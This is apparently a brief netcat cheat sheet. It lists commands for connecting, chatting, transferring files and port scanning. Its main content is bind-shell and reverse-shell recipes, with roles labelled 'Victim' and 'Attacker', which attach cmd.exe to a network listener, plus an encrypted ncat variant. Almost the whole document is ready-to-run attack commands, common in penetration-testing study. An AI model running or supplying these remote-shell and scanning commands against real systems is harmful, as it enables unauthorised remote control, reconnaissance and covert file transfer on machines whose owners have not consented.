`nc -nv <ip> <port>`

# Simple Chat

`nc -nlvp 4444`
`nc -nv <ip> 4444`

# File Transfer

`nc -nlvp 4444 > file.exe`
`nc -nv <ip> 4444 < file.exe`

# Bind Shell

### Victim (server)
`nc -lvp 4444 -e cmd.exe`

### Attacker (client)
`nc -nv <IP Address> 4444`

# Reverse Shell

### Attacker (server)
`nc -lvp 4444`

### Victim (client)
`nc -nv <IP Address> 4444 -e cmd.exe`

# NCAT for increased security (SSL/TLS)

### Victim (server)
`ncat -lvp 4444 -e cmd.exe --allow 192.168.30.5 --ssl`

### Attacker (client)
`ncat -nv <IP Address> 4444 --ssl`

# Port Scanning

### TCP Connect Port Scan

`nc -nvv -w 1 -z <ip> 1-65550`

### UDP Scan

`nc -unvv -w 1 -z <ip> 1-65550`
